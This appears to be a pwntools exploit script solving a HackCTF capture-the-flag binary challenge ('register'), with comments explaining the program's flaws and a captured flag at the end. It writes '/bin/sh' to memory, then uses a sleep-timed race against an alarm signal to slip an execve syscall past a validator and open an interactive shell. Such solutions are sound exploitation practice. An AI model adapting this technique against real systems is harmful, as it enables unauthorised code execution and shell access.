from pwn import * 

#p = process("./register")
p = remote("ctf.j0n9hyun.xyz",3026)
#gdb.attach(p)
#print register's name, input somewhere.
# get_ll func getting input into stack, through atoi funcion, input values changed 
# numeric value. get_ll func works done, it mov to 6010a0 adress location (global list obj)
# in validate_syscall_obj func, if RAX input = 0, 1, 2, 3, 3c. 
# set $rbp-0x4 to 0. else it set to 1 and return it to eax . 
# if eax is 1, input stage will be repeated. else , raise(0xe) func will be called.
# in get_inp func, read(0,buf,0x20) call. after input , compare last chr with 0xa, change to \x00
# i found handler func, and it call exec_syscall_obj func , this func doing syscall 
# by inputted register. 
# in build, signal function check get 0xe signal, it will be carried out by handler.
# so, i have to call raise(0xe) for calling function with inputted registers.
# but it only can call read, write, open, close, exit. 
# secenario : write "/bin/sh" , call execve

obj_adr = 0x6010a0
bss = 0x601100
# for call read(0,bss,8) => rax: 0 ,rdi : 0, rsi : bss , rdx : 0 
#pause()
p.sendlineafter("RAX:",str(0))	#rax
p.sendlineafter("RDI:",str(0))	#rdi
p.sendlineafter("RSI:",str(bss))	#rsi
p.sendlineafter("RDX:",str(8))		#rdx
p.sendlineafter("RCX:",str(0))
p.sendlineafter("R8:",str(0))
p.sendlineafter("R9:",str(0))

log.info("first step end\n")
p.send("/bin/sh\x00")

# for call execve(bss,0,0) => rax: 3b ,rdi :bss, rsi : 0 , rdx : 0 
# i have to set time . if rax = 0x3b, syscall will not called. 
# so, send valid rax value and send execve before getting signal from raise().
# alarm() func call every 5 sec. so, execve send - signal will have 5 sec term.
# so i should find right timing and set sleep. 
sleep(4.4)

p.sendlineafter("RAX:",str(0x3b))	#rax
p.sendlineafter("RDI:",str(bss))	#rdi
p.sendlineafter("RSI:",str(0))	#rsi
p.sendlineafter("RDX:",str(0))		#rdx
p.sendlineafter("RCX:",str(0))
p.sendlineafter("R8:",str(0))
p.sendlineafter("R9:",str(0))
log.info("final end\n")

p.interactive()


#HackCTF{6316964770251056468501091137477179868692}